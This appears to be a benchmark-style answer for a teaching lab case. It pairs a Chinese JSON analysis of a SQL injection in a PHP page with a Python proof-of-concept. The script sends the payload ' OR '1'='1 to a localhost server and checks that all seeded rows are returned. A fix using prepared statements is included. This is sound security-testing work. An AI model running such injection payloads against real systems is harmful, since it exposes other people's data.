@@ -1,0 +1,79 @@
+```json
+{"sample_id":"S001","prediction":"vulnerable","vulnerability_type":"SQL注入","locations":["F01:0007","F01:0010","F01:0011"],"evidence":{"source":"F01:0007 从 $_GET['name'] 读取外部输入并赋给 $name。","flow":"F01:0007 的 $name 在 F01:0010 直接拼入 SQL 字符串，随后 F01:0011 交给 $db->query 执行。","guard":"无效：F01:0010 无预处理绑定、白名单或转义；F01:0022-0023 的 htmlspecialchars 仅用于 HTML 输出编码，不影响 SQL 解析。","sink":"F01:0011 $db->query($sql) 是可达的 SQL 执行点。"},"prerequisites":["PHP + MariaDB 本地教学服务运行，入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问","common/db_connect.php 按运行上下文提供已连接的 mysqli 变量 $db","lab_people 表存在且预置 1 Alice、2 Bob、3 Carol","无需登录"],"missing_context":["输入包未包含 common/db_connect.php 的具体实现；本判断依据 runtime_context 已声明 $db 可用，连接失败处理与字符集细节未展开。","输入包未给出数据库当前数据是否被改动；POC 以预置数据为前提并只做只读对照。"],"poc_generated":true,"poc_language":"python3","poc_instructions":"保存为 s001_poc.py 后运行 python3 s001_poc.py。脚本固定访问 127.0.0.1:4280，不跟随重定向、不修改数据。普通请求 name=Alice，预期解析到的业务记录为 [('1','Alice')]；测试请求 name=' OR '1'='1，预期解析记录至少包含 ('1','Alice')、('2','Bob')、('3','Carol')，且与普通记录不同。成功断言比较解析后的 ID/name 记录集合，不以 HTTP 200 作为成功条件。浏览器观察：普通请求只显示 Alice 一行，测试请求显示预置三行；数据库应无变化。失败时检查服务是否运行、路径是否正确、common/db_connect.php 与 $db 是否可用、lab_people 预置数据是否存在、页面是否出现查询失败。防护建议：使用 mysqli prepare 和 bind_param 将 name 作为绑定值，不要拼接 SQL；输出编码保留。"}
+```
+
+```python
+import http.client
+import re
+import sys
+from urllib.parse import quote
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+TIMEOUT = 5
+
+NORMAL_NAME = "Alice"
+TEST_NAME = "' OR '1'='1"
+
+
+def fetch(name):
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
+    try:
+        target = PATH + "?name=" + quote(name, safe="")
+        conn.request(
+            "GET",
+            target,
+            headers={
+                "Host": f"{HOST}:{PORT}",
+                "Connection": "close",
+            },
+        )
+        resp = conn.getresponse()
+        body = resp.read().decode("utf-8", errors="replace")
+        return resp.status, body
+    finally:
+        conn.close()
+
+
+def parse_records(body):
+    return re.findall(r"<p>ID\s*(\d+)\s*：\s*([^<]*)</p>", body)
+
+
+def main():
+    status_normal, body_normal = fetch(NORMAL_NAME)
+    status_test, body_test = fetch(TEST_NAME)
+
+    normal_records = parse_records(body_normal)
+    test_records = parse_records(body_test)
+
+    print("普通 HTTP 状态:", status_normal)
+    print("普通请求解析记录:", normal_records)
+    print("测试 HTTP 状态:", status_test)
+    print("测试请求解析记录:", test_records)
+
+    ok_normal = status_normal == 200 and normal_records == [("1", "Alice")]
+    expected = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+    ok_test = (
+        status_test == 200
+        and expected.issubset(set(test_records))
+        and test_records != normal_records
+    )
+
+    if ok_normal and ok_test:
+        print("PASS: 普通输入仅返回 Alice；测试输入返回预置三行，实际业务记录差异符合 SQL 注入路径。")
+        return 0
+
+    print("FAIL/无法判断：请检查服务、路径、common/db_connect.php、$db、lab_people 预置数据和查询失败提示。")
+    if "查询失败" in body_normal or "查询失败" in body_test:
+        print("页面出现查询失败提示，需检查数据库连接和 SQL 执行环境。")
+    if not ok_normal:
+        print("普通对照未满足，预期记录为 [('1','Alice')]。")
+    if not ok_test:
+        print("测试未满足：预期至少包含 ('1','Alice')、('2','Bob')、('3','Carol') 且不同于普通记录。")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
